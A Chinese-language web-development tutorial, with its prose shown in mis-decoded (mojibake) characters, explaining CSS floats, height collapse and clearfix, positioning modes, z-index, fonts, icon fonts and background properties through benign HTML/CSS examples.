ç½é¡µçåºç¡å¸å±\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>Document</title>\n    <style>\n\n      header, main, footer{\n        width: 1000px;\n        margin: 0 auto;\n      }\n\n      /* è®¾ç½®å¤´é¨ */\n      header{\n        height: 150px;\n        background-color: silver;\n      }\n\n      /* è®¾ç½®ä¸»ä½ */\n      main{\n        height: 500px;\n        background-color: #bfa;\n        margin: 10px auto;\n      }\n\n      nav, article, aside{\n        float: left;\n        height: 100%;\n      }\n\n      /* è®¾ç½®å·¦ä¾§çå¯¼èª */\n      nav{\n        width: 200px;\n        background-color: yellow;\n      }\n\n      /* è®¾ç½®ä¸­é´çåå®¹ */\n      article{\n        width: 580px;\n        background-color: orange;\n        margin: 0 10px;\n      }\n\n      /* è®¾ç½®å³ä¾§çåå®¹ */\n      aside{\n        width: 200px;\n        background-color: pink;\n      }\n\n      /* è®¾ç½®åºé¨ */\n      footer{\n        height: 150px;\n        background-color: tomato;\n      }\n    </style>\n  </head>\n  <body>\n\n    \x3c!-- åå»ºå¤´é¨ --\x3e\n    <header></header>\n\n    \x3c!-- åå»ºç½é¡µçä¸»ä½ --\x3e\n    <main>\n      \x3c!-- å·¦ä¾§å¯¼èª --\x3e\n      <nav></nav>\n\n      \x3c!-- ä¸­é´çåå®¹ --\x3e\n      <article></article>\n\n      \x3c!-- å³è¾¹çè¾¹æ  --\x3e\n      <aside></aside>\n\n    </main>\n\n    \x3c!-- ç½é¡µçåºé¨ --\x3e\n    <footer></footer>\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n\n\n# é«åº¦å¡é·é®é¢\n\nå¨æµ®å¨å¸å±ä¸­ï¼ç¶åç´ çé«åº¦é»è®¤æ¯è¢«å­åç´ æå¼çï¼å½å­åç´ æµ®å¨åï¼å¶ä¼å®å¨è±ç¦»ææ¡£æµï¼å­åç´ ä»ææ¡£æµä¸­è±ç¦»ï¼å°ä¼æ æ³æèµ·ç¶åç´ çé«åº¦ï¼å¯¼è´ç¶åç´ çé«åº¦ä¸¢å¤±ãç¶åç´ é«åº¦ä¸¢å¤±ä»¥åï¼å¶ä¸çåç´ ä¼èªå¨ä¸ç§»ï¼å¯¼è´é¡µé¢çå¸å±æ··ä¹±ãæä»¥é«åº¦å¡é·æ¯æµ®å¨å¸å±ä¸­æ¯è¾å¸¸è§çä¸ä¸ªé®é¢ï¼è¿ä¸ªé®é¢æä»¬å¿é¡»è¦è¿è¡å¤çï¼\n\nBFC(Block Formatting Context) åçº§æ ¼å¼åç¯å¢ï¼BFCæ¯ä¸ä¸ªCSSä¸­çä¸ä¸ªéå«çå±æ§ï¼å¯ä»¥ä¸ºä¸ä¸ªåç´ å¼å¯BFCãå¼å¯BFCè¯¥åç´ ä¼åæä¸ä¸ªç¬ç«çå¸å±åºå\n\nåç´ å¼å¯BFCåçç¹ç¹ï¼\n\n 1. å¼å¯BFCçåç´ ä¸ä¼è¢«æµ®å¨åç´ æè¦ç\n 2. å¼å¯BFCçåç´ å­åç´ åç¶åç´ å¤è¾¹è·ä¸ä¼éå \n 3. å¼å¯BFCçåç´ å¯ä»¥åå«æµ®å¨çå­åç´ \n\nå¯ä»¥éè¿ä¸äºç¹æ®æ¹å¼æ¥å¼å¯åç´ çBFCï¼\n\n 1. è®¾ç½®åç´ çæµ®å¨ï¼ä¸æ¨èï¼\n 2. å°åç´ è®¾ç½®ä¸ºè¡åååç´ ï¼ä¸æ¨èï¼\n 3. å°åç´ çoverflowè®¾ç½®ä¸ºä¸ä¸ªévisibleçå¼\n\nå¸¸ç¨çæ¹å¼ï¼ä¸ºåç´ è®¾ç½® overflow:hidden å¼å¯å¶BFC ä»¥ä½¿å¶å¯ä»¥åå«æµ®å¨åç´ ã\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>Document</title>\n    <style>\n      .outer{\n        border: 10px red solid;\n        overflow: hidden;\n      }\n\n      .inner{\n        width: 100px;\n        height: 100px;\n        background-color: #bfa;\n        float: left;\n      }\n    </style>\n  </head>\n  <body>\n\n    <div class="outer">\n\n      <div class="inner"></div>\n\n    </div>\n\n    <div style="width: 200px;height: 200px;background-color:yellow;"></div>\n\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n# Clearæ¸é¤æµ®å¨å½±å\n\nç±äºbox1çæµ®å¨ï¼å¯¼è´box3ä½ç½®ä¸ç§»ãä¹å°±æ¯box3æ¶å°äºbox1æµ®å¨çå½±åï¼ä½ç½®åçäºæ¹åã\n\nå¦ææä»¬ä¸å¸ææä¸ªåç´ å ä¸ºå¶ä»åç´ æµ®å¨çå½±åèæ¹åä½ç½®ï¼å¯ä»¥éè¿clearå±æ§æ¥æ¸é¤æµ®å¨åç´ å¯¹å½ååç´ æäº§ççå½±å\n\nä½ç¨ï¼æ¸é¤æµ®å¨åç´ å¯¹å½ååç´ æäº§ççå½±å\n\nå¯éå¼ï¼\n\n * left æ¸é¤å·¦ä¾§æµ®å¨åç´ å¯¹å½ååç´ çå½±å\n\n * right æ¸é¤å³ä¾§æµ®å¨åç´ å¯¹å½ååç´ çå½±å\n\n * both æ¸é¤ä¸¤ä¾§ä¸­æå¤§å½±åçé£ä¾§\n\nåçï¼è®¾ç½®æ¸é¤æµ®å¨ä»¥åï¼æµè§å¨ä¼èªå¨ä¸ºåç´ æ·»å ä¸ä¸ªä¸å¤è¾¹è·ï¼ä»¥ä½¿å¶ä½ç½®ä¸åå¶ä»åç´ çå½±å\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>Document</title>\n    <style>\n\n      div{\n        font-size: 50px;\n      }\n\n      .box1{\n        width: 200px;\n        height: 200px;\n        background-color: #bfa;\n        float: left;\n      }\n\n      .box2{\n        width: 400px;\n        height: 150px;\n        background-color: #ff0;\n        float: right;\n      }\n\n      .box3{\n        width: 200px;\n        height: 200px;\n        background-color: orange;\n        clear: both;\n      }\n    </style>\n  </head>\n  <body>\n\n    <div class="box1">1</div>\n    <div class="box2">2</div>\n    <div class="box3">3</div> \n\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n# é«åº¦å¡é·é®é¢çè§£å³æ¹æ¡\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>Document</title>\n    <style>\n      .box1{\n        border: 10px red solid;\n\n        /* overflow: hidden; */\n      }\n\n      .box2{\n        width: 100px;\n        height: 100px;\n        background-color: #bfa;\n        float: left;\n      }\n\n      .box3{\n        clear: both;\n      }\n\n      .box1::after{\n        content: \'\';\n        display: block;\n        clear: both;\n      }\n\n    </style>\n  </head>\n  <body>\n\n    <div class="box1">\n      <div class="box2"></div>\n      \x3c!-- <div class="box3"></div> --\x3e\n    </div>\n\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n# clearfix\n\nclearfix è¿ä¸ªæ ·å¼å¯ä»¥åæ¶è§£å³é«åº¦å¡é·åå¤è¾¹è·éå çé®é¢ï¼å½ä½ å¨éå°è¿äºé®é¢æ¶ï¼ç´æ¥ä½¿ç¨clearfixè¿ä¸ªç±»å³å¯ ã\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>Document</title>\n    <style>\n      .box1{\n        width: 200px;\n        height: 200px;\n        background-color: #bfa;\n      }\n\n      /* .box1::before{\n      content: \'\';\n      display: table;\n      } */\n\n      .box2{\n        width: 100px;\n        height: 100px;\n        background-color: orange;\n        margin-top: 100px;\n      }\n\n      /* clearfix è¿ä¸ªæ ·å¼å¯ä»¥åæ¶è§£å³é«åº¦å¡é·åå¤è¾¹è·éå çé®é¢ï¼å½ä½ å¨éå°è¿äºé®é¢æ¶ï¼ç´æ¥ä½¿ç¨clearfixè¿ä¸ªç±»å³å¯ */\n      .clearfix::before,\n      .clearfix::after{\n        content: \'\';\n        display: table;\n        clear: both;\n      }\n    </style>\n  </head>\n  <body>\n\n    <div class="box1 clearfix">\n      <div class="box2"></div>\n    </div>\n\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# å®ä½\n\n# å®ä½ç®ä»\n\nå®ä½ï¼positionï¼\n\nå®ä½æ¯ä¸ç§æ´å é«çº§çå¸å±ææ®µï¼éè¿å®ä½å¯ä»¥å°åç´ ææ¾å°é¡µé¢çä»»æä½ç½®ãä½¿ç¨positionå±æ§æ¥è®¾ç½®å®ä½ã\n\n * static é»è®¤å¼ï¼åç´ æ¯éæ­¢çæ²¡æå¼å¯å®ä½\n * relative å¼å¯åç´ çç¸å¯¹å®ä½\n * absolute å¼å¯åç´ çç»å¯¹å®ä½\n * fixed å¼å¯åç´ çåºå®å®ä½\n * sticky å¼å¯åç´ çç²æ»å®ä½\n\nç¸å¯¹å®ä½ï¼\n\nå½åç´ çpositionå±æ§å¼è®¾ç½®ä¸ºrelativeæ¶åå¼å¯äºåç´ çç¸å¯¹å®ä½ã\n\nç¸å¯¹å®ä½çç¹ç¹ï¼\n\n 1. åç´ å¼å¯ç¸å¯¹å®ä½ä»¥åï¼å¦æä¸è®¾ç½®åç§»éåç´ ä¸ä¼åçä»»ä½çåå\n 2. ç¸å¯¹å®ä½æ¯åç§äºåç´ å¨ææ¡£æµä¸­çä½ç½®è¿è¡å®ä½ç\n 3. ç¸å¯¹å®ä½ä¼æååç´ çå±çº§\n 4. ç¸å¯¹å®ä½ä¸ä¼ä½¿åç´ è±ç¦»ææ¡£æµ\n 5. ç¸å¯¹å®ä½ä¸ä¼æ¹ååç´ çæ§è´¨åè¿æ¯åï¼è¡åè¿æ¯è¡å\n\nåç§»éï¼offsetï¼\n\nå½åç´ å¼å¯äºå®ä½ä»¥åï¼å¯ä»¥éè¿åç§»éæ¥è®¾ç½®åç´ çä½ç½®\n\ntop\n\n * å®ä½åç´ åå®ä½ä½ç½®ä¸è¾¹çè·ç¦»\n\nbottom\n\n * å®ä½åç´ åå®ä½ä½ç½®ä¸è¾¹çè·ç¦»ï¼å®ä½åç´ åç´æ¹åçä½ç½®ç±topåbottomä¸¤ä¸ªå±æ§æ¥æ§å¶ãéå¸¸æåµä¸æä»¬åªä¼ä½¿ç¨å¶ä¸­ä¸\n * topå¼è¶å¤§ï¼å®ä½åç´ è¶åä¸ç§»å¨\n * bottomå¼è¶å¤§ï¼å®ä½åç´ è¶åä¸ç§»å¨\n\nleft\n\n * å®ä½åç´ åå®ä½ä½ç½®çå·¦ä¾§è·ç¦»\n\nright\n\n * å®ä½åç´ åå®ä½ä½ç½®çå³ä¾§è·ç¦»\n * å®ä½åç´ æ°´å¹³æ¹åçä½ç½®ç±leftårightä¸¤ä¸ªå±æ§æ§å¶ãéå¸¸æåµä¸åªä¼ä½¿ç¨ä¸ä¸ª\n * leftè¶å¤§åç´ è¶é å³\n * rightè¶å¤§åç´ è¶é å·¦\n\n# ç»å¯¹å®ä½\n\nç»å¯¹å®ä½\n- å½åç´ çpositionå±æ§å¼è®¾ç½®ä¸ºabsoluteæ¶ï¼åå¼å¯äºåç´ çç»å¯¹å®ä½\n- ç»å¯¹å®ä½çç¹ç¹ï¼\n1.å¼å¯ç»å¯¹å®ä½åï¼å¦æä¸è®¾ç½®åç§»éåç´ çä½ç½®ä¸ä¼åçåå\n2.å¼å¯ç»å¯¹å®ä½åï¼åç´ ä¼ä»ææ¡£æµä¸­è±ç¦»\n3.ç»å¯¹å®ä½ä¼æ¹ååç´ çæ§è´¨ï¼è¡ååæåï¼åçå®½é«è¢«åå®¹æå¼\n4.ç»å¯¹å®ä½ä¼ä½¿åç´ æåä¸ä¸ªå±çº§\n5.ç»å¯¹å®ä½åç´ æ¯ç¸å¯¹äºå¶åå«åè¿è¡å®ä½ç\n\nåå«å( containing block )\n- æ­£å¸¸æåµä¸ï¼\nåå«åå°±æ¯ç¦»å½ååç´ æè¿çç¥åååç´ \n&lt;div> &lt;div>&lt;/div> &lt;/div>\n&lt;div>&lt;span>&lt;em>hello&lt;/em>&lt;/span>&lt;/div>\n\n- ç»å¯¹å®ä½çåå«å:\nåå«åå°±æ¯ç¦»å®æè¿çå¼å¯äºå®ä½çç¥ååç´ ï¼\nå¦æææçç¥ååç´ é½æ²¡æå¼å¯å®ä½åæ ¹åç´ å°±æ¯å®çåå«å\n- htmlï¼æ ¹åç´ ãåå§åå«åï¼\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# åºå®å®ä½\n\nå°åç´ çpositionå±æ§è®¾ç½®ä¸ºfixedåå¼å¯äºåç´ çåºå®å®ä½ãåºå®å®ä½ä¹æ¯ä¸ç§ç»å¯¹å®ä½ï¼æä»¥åºå®å®ä½çå¤§é¨åç¹ç¹é½åç»å¯¹å®ä½ä¸æ ·ï¼å¯ä¸ä¸åçæ¯åºå®å®ä½æ°¸è¿åç§äºæµè§å¨çè§å£è¿è¡å®ä½ãåºå®å®ä½çåç´ ä¸ä¼éç½é¡µçæ»å¨æ¡æ»å¨ã\n\n# ç²æ»å®ä½\n\nå½åç´ çpositionå±æ§è®¾ç½®ä¸ºstickyæ¶åå¼å¯äºåç´ çç²æ»å®ä½ï¼ç²æ»å®ä½åç¸å¯¹å®ä½çç¹ç¹åºæ¬ä¸è´ï¼ä¸åçæ¯ç²æ»å®ä½å¯ä»¥å¨åç´ å°è¾¾æä¸ªä½ç½®æ¶å°å¶åºå®ã\n\n<!DOCTYPE html>\n<html lang="en">\n\n  <head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>å¯¼èªæ¡</title>\n    <link rel="stylesheet" href="./css/reset.css">\n    <style>\n\n      body{\n        height: 3000px;\n      }\n\n      /* è®¾ç½®navçå¤§å° */\n      .nav{\n\n        /* è®¾ç½®å®½åº¦åé«åº¦ */\n        width: 1210px;\n        height: 48px;\n        /* è®¾ç½®èæ¯é¢è² */\n        background-color: #E8E7E3;\n\n        margin:100px auto;\n\n        position: sticky;\n        top: 10px;\n\n      }\n\n      /* è®¾ç½®navä¸­li */\n      .nav li{\n        /* è®¾ç½®liåå·¦æµ®å¨ï¼å·²ä½¿èåæ¨ªåæå */\n        float: left;\n        /* è®¾ç½®liçé«åº¦ */\n        /* height: 48px; */\n        /* å°æå­å¨ç¶åç´ ä¸­åç´å±ä¸­ */\n        line-height: 48px;\n\n      }\n\n      /* è®¾ç½®açæ ·å¼ */\n      .nav a{\n        /* å°aè½¬æ¢ä¸ºååç´  */\n        display: block;\n        /* å»é¤ä¸åçº¿ */\n        text-decoration: none;\n        /* è®¾ç½®å­ä½é¢è² */\n        color: #777777;\n        /* ä¿®æ¹å­ä½å¤§å° */\n        font-size: 18px;\n\n        padding: 0 39px;\n      }\n\n      .nav li:last-child a{\n        padding: 0 42px 0 41px;\n      }\n\n      /* è®¾ç½®é¼ æ ç§»å¥çææ */\n      .nav a:hover{\n        background-color: #3F3F3F;\n        color: #E8E7E3;\n      }\n    </style>\n  </head>\n\n  <body>\n    \x3c!-- åå»ºå¯¼èªæ¡çç»æ --\x3e\n    <ul class="nav">\n      <li>\n        <a href="#">HTML/CSS</a>\n      </li>\n      <li>\n        <a href="#">Browser Side</a>\n      </li>\n      <li>\n        <a href="#">Server Side</a>\n      </li>\n      <li>\n        <a href="#">Programming</a>\n      </li>\n      <li>\n        <a href="#">XML</a>\n      </li>\n      <li>\n        <a href="#">Web Building</a>\n      </li>\n      <li>\n        <a href="#">Reference</a>\n      </li>\n    </ul>\n\n  </body>\n\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n\n\n# ç»å¯¹å®ä½ä¸çåç´ å¸å±\n\næ°´å¹³å¸å±\n\nleft + margin-left + border-left + padding-left + width + padding-right + border-right + margin-right + right = åå«åçåå®¹åºçå®½åº¦\n\nå½æä»¬å¼å¯äºç»å¯¹å®ä½åï¼æ°´å¹³æ¹åçå¸å±ç­å¼å°±éè¦æ·»å left å right ä¸¤ä¸ªå¼ãæ­¤æ¶è§ååä¹åä¸æ ·åªæ¯å¤æ·»å äºä¸¤ä¸ªå¼ãå½åçè¿åº¦çº¦æï¼å¦æ9ä¸ªå¼ä¸­æ²¡æ auto åèªå¨è°æ´rightå¼ä»¥ä½¿ç­å¼æ»¡è¶³ï¼å¦ææautoï¼åèªå¨è°æ´autoçå¼ä»¥ä½¿ç­å¼æ»¡è¶³ã\n\nå¯è®¾ç½®autoçå¼\n\n * margin\n * width\n * left\n * right\n\nå ä¸ºleft å rightçå¼é»è®¤æ¯autoï¼æä»¥å¦æä¸æå®leftårightãåç­å¼ä¸æ»¡è¶³æ¶ï¼ä¼èªå¨è°æ´è¿ä¸¤ä¸ªå¼ã\n\nåç´æ¹åå¸å±çç­å¼çä¹å¿é¡»è¦æ»¡è¶³ï¼\n\ntop + margin-top/bottom + padding-top/bottom + border-top/bottom + height = åå«åçé«åº¦\n\n# åç´ å±çº§\n\nå¯¹äºå¼å¯äºå®ä½åç´ ï¼å¯ä»¥éè¿z-indexå±æ§æ¥æå®åç´ çå±çº§ãz-indexéè¦ä¸ä¸ªæ´æ°ä½ä¸ºåæ°ï¼å¼è¶å¤§åç´ çå±çº§è¶é«ï¼åç´ çå±çº§è¶é«è¶ä¼åæ¾ç¤ºãå¦æåç´ çå±çº§ä¸æ ·ï¼åä¼åæ¾ç¤ºé ä¸çåç´ ãç¥åçåç´ çå±çº§åé«ä¹ä¸ä¼çä½åä»£åç´ ã\n\n\n# å­ä½åèæ¯\n\n# å­ä½\n\nå­ä½ç¸å³çæ ·å¼ï¼\n\n * color ç¨æ¥è®¾ç½®å­ä½é¢è²\n\n * font-size å­ä½çå¤§å°\n\nfont-sizeç¸å³çåä½\n\n * em ç¸å½äºå½ååç´ çä¸ä¸ªfont-size\n\n * rem ç¸å¯¹äºæ ¹åç´ çä¸ä¸ªfont-size\n\nfont-family å­ä½æï¼å­ä½çæ ¼å¼ï¼\n\n * serif è¡¬çº¿å­ä½\n\n * sans-serif éè¡¬çº¿å­ä½\n\n * monospace ç­å®½å­ä½\n\næå®å­ä½çç±»å«ï¼æµè§å¨ä¼èªå¨ä½¿ç¨è¯¥ç±»å«ä¸çå­ä½ï¼font-family å¯ä»¥åæ¶æå®å¤ä¸ªå­ä½ï¼å¤ä¸ªå­ä½é´ä½¿ç¨,éå¼\n\nå­ä½çææ¶ä¼åä½¿ç¨ç¬¬ä¸ä¸ªï¼ç¬¬ä¸ä¸ªæ æ³ä½¿ç¨åä½¿ç¨ç¬¬äºä¸ª ä»¥æ­¤ç±»æ¨ã\n\n# å¾æ å­ä½\n\nå¾æ å­ä½ï¼iconfontï¼\n\n * å¨ç½é¡µä¸­ç»å¸¸éè¦ä½¿ç¨ä¸äºå¾æ ï¼å¯ä»¥éè¿å¾çæ¥å¼å¥å¾æ ï¼ä½æ¯å¾çå¤§å°æ¬èº«æ¯è¾å¤§ï¼å¹¶ä¸éå¸¸çä¸çµæ´»\n * æä»¥å¨ä½¿ç¨å¾æ æ¶ï¼æä»¬è¿å¯ä»¥å°å¾æ ç´æ¥è®¾ç½®ä¸ºå­ä½ï¼ç¶åéè¿font-faceçå½¢å¼æ¥å¯¹å­ä½è¿è¡å¼å¥\n * è¿æ ·æä»¬å°±å¯ä»¥éè¿ä½¿ç¨å­ä½çå½¢å¼æ¥ä½¿ç¨å¾æ ã\n\nfontawesome ä½¿ç¨æ­¥éª¤\n\n 1. ä¸è½½ https://fontawesome.com/\n 2. è§£å\n 3. å°cssåwebfontsç§»å¨å°é¡¹ç®ä¸­\n 4. å°all.csså¼å¥å°ç½é¡µä¸­\n 5. ä½¿ç¨å¾æ å­ä½\n\nç´æ¥éè¿ç±»åæ¥ä½¿ç¨å¾æ å­ä½\n\nclass="fas fa-bell"\nclass="fab fa-accessible-icon"\n\n<i class="fas fa-bell" style="font-size:80px; color:red;"></i>\n<i class="fas fa-bell-slash"></i>\n<i class="fab fa-accessible-icon"></i>\n<i class="fas fa-otter" style="font-size: 160px; color:green;"></i>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\néè¿ä¼ªåç´ æ¥è®¾ç½®å¾æ å­ä½\n\n 1. æ¾å°è¦è®¾ç½®å¾æ çåç´ éè¿beforeæafteréä¸­\n\n 2. å¨contentä¸­è®¾ç½®å­ä½çç¼ç \n\n 3. è®¾ç½®å­ä½çæ ·å¼\n\ncontent: \'\\f1b0\';\n/* font-family: \'Font Awesome 5 Brands\'; */\nfont-family: \'Font Awesome 5 Free\';\nfont-weight: 900; \ncolor: blue;\nmargin-right: 10px;\n\n\n1\n2\n3\n4\n5\n6\n\n\né¿éå¾æ å­ä½åº\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>Document</title>\n    <link rel="stylesheet" href="./iconfont/iconfont.css">\n    <style>\n      i.iconfont{\n        font-size: 100px;\n      }\n\n      p::before{\n        content: \'\\e625\';\n        font-family: \'iconfont\';\n        font-size: 100px;\n      }\n    </style>\n  </head>\n  <body>\n\n    <i class="iconfont">&#xe61c;</i>\n    <i class="iconfont">&#xe622;</i>\n    <i class="iconfont">&#xe623;</i>\n\n    <i class="iconfont icon-qitalaji"></i>\n\n    <p>Hello</p>\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n# å­ä½è®¾ç½®\n\nè¡é«ï¼line heightï¼ï¼è¡é«æçæ¯æå­å æçå®éé«åº¦ãå¯ä»¥éè¿line-heightæ¥è®¾ç½®è¡é«ï¼è¡é«å¯ä»¥ç´æ¥æå®ä¸ä¸ªå¤§å°ï¼px emï¼ï¼ä¹å¯ä»¥ç´æ¥ä¸ºè¡é«è®¾ç½®ä¸ä¸ªæ´æ°ãå¦ææ¯ä¸ä¸ªæ´æ°çè¯ï¼è¡é«å°ä¼æ¯å­ä½çæå®çåæ°ãè¡é«ç»å¸¸è¿ç¨æ¥è®¾ç½®æå­çè¡é´è·ï¼è¡é´è· = è¡é« - å­ä½å¤§å°ã\n\nå­ä½æ¡ï¼å­ä½æ¡å°±æ¯å­ä½å­å¨çæ ¼å­ï¼è®¾ç½®font-sizeå®éä¸å°±æ¯å¨è®¾ç½®å­ä½æ¡çé«åº¦ï¼è¡é«ä¼å¨å­ä½æ¡çä¸ä¸å¹³ååéã\n\nå­ä½å¯ä»¥ä½¿ç¨ä¸é¢çç®åå±æ§ï¼\n\ndiv{\n  border: 1px red solid;\n  /* \n  font å¯ä»¥è®¾ç½®å­ä½ç¸å³çææå±æ§\n  è¯­æ³ï¼\n  font: å­ä½å¤§å°/è¡é« å­ä½æ\n  è¡é« å¯ä»¥çç¥ä¸å å¦æä¸åä½¿ç¨é»è®¤å¼\n  */\n\n  /* font-size: 50px;\n  font-family: \'Times New Roman\', Times, serif; */\n  font-weight: bold;\n  /* font: 50px/2  å¾®è½¯éé», \'Times New Roman\', Times, serif; */\n  /* font: normal normal 50px/2  å¾®è½¯éé», \'Times New Roman\', Times, serif; */\n  font: bold italic 50px/2  å¾®è½¯éé», \'Times New Roman\', Times, serif;\n  /* font:50px \'Times New Roman\', Times, serif;\n  line-height: 2; */\n\n  /* font-size: 50px; */\n  /* font-weight å­é å­ä½çå ç² \n  å¯éå¼ï¼\n  normal é»è®¤å¼ ä¸å ç²\n  bold å ç²\n  100-900 ä¹ä¸ªçº§å«ï¼æ²¡ä»ä¹ç¨ï¼\n  font-style å­ä½çé£æ ¼\n  normal æ­£å¸¸ç\n  italic æä½\n  */\n  /* font-weight: bold; */\n  /* font-weight: 500;\n  font-style: italic; */\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n# ææ¬æ ·å¼\n\ntext-align ææ¬çæ°´å¹³å¯¹é½\n\n * left å·¦ä¾§å¯¹é½\n\n * right å³å¯¹é½\n\n * center å±ä¸­å¯¹é½\n\n * justify ä¸¤ç«¯å¯¹é½\n\nvertical-align è®¾ç½®åç´ åç´å¯¹é½çæ¹å¼\n\n * baseline é»è®¤å¼ åºçº¿å¯¹é½\n\n * top é¡¶é¨å¯¹é½\n\n * bottom åºé¨å¯¹é½\n\n * middle å±ä¸­å¯¹é½\n\ntext-decoration è®¾ç½®ææ¬ä¿®é¥°\n\n * none ä»ä¹é½æ²¡æ\n\n * underline ä¸åçº¿\n\n * line-through å é¤çº¿\n\n * overline ä¸åçº¿\n\nwhite-space è®¾ç½®ç½é¡µå¦ä½å¤çç©ºç½\n\n * normal æ­£å¸¸\n\n * nowrap ä¸æ¢è¡\n\n * pre ä¿çç©ºç½\n\n# èæ¯è®¾ç½®\n\nbackground-image è®¾ç½®èæ¯å¾ç\n\n * å¯ä»¥åæ¶è®¾ç½®èæ¯å¾çåèæ¯é¢è²ï¼è¿æ ·èæ¯é¢è²å°ä¼æä¸ºå¾ççèæ¯è²\n * å¦æèæ¯çå¾çå°äºåç´ ï¼åèæ¯å¾çä¼èªå¨å¨åç´ ä¸­å¹³éºå°åç´ éºæ»¡\n * å¦æèæ¯çå¾çå¤§äºåç´ ï¼å°ä¼ä¸ä¸ªé¨åèæ¯æ æ³å®å¨æ¾ç¤º\n * å¦æèæ¯å¾çååç´ ä¸æ ·å¤§ï¼åä¼ç´æ¥æ­£å¸¸æ¾ç¤º\n\nbackground-repeat ç¨æ¥è®¾ç½®èæ¯çéå¤æ¹å¼\n\n * repeat é»è®¤å¼ ï¼ èæ¯ä¼æ²¿çxè½´ yè½´åæ¹åéå¤\n\n * repeat-x æ²¿çxè½´æ¹åéå¤\n\n * repeat-y æ²¿çyè½´æ¹åéå¤\n\n * no-repeat èæ¯å¾çä¸éå¤\n\nbackground-position ç¨æ¥è®¾ç½®èæ¯å¾ççä½ç½®ï¼éè¿ top left right bottom center å ä¸ªè¡¨ç¤ºæ¹ä½çè¯æ¥è®¾ç½®èæ¯å¾ççä½ç½®\n\nä½¿ç¨æ¹ä½è¯æ¶å¿é¡»è¦åæ¶æå®ä¸¤ä¸ªå¼ï¼å¦æåªåä¸ä¸ªåç¬¬äºä¸ªé»è®¤å°±æ¯center\n\néè¿åç§»éæ¥æå®èæ¯å¾ççä½ç½®ï¼æ°´å¹³æ¹åçåç§»é åç´æ¹ååé\n\nbackground-position: -50px 300px;\n\nè®¾ç½®èæ¯çèå´ background-clip\n\n * border-box é»è®¤å¼ï¼èæ¯ä¼åºç°å¨è¾¹æ¡çä¸è¾¹\n\n * padding-box èæ¯ä¸ä¼åºç°å¨è¾¹æ¡ï¼åªåºç°å¨åå®¹åºååè¾¹è·\n\n * content-box èæ¯åªä¼åºç°å¨åå®¹åº\n\nbackground-origin èæ¯å¾ççåç§»éè®¡ç®çåç¹\n\n * padding-box é»è®¤å¼ï¼background-positionä»åè¾¹è·å¤å¼å§è®¡ç®\n\n * content-box èæ¯å¾ççåç§»éä»å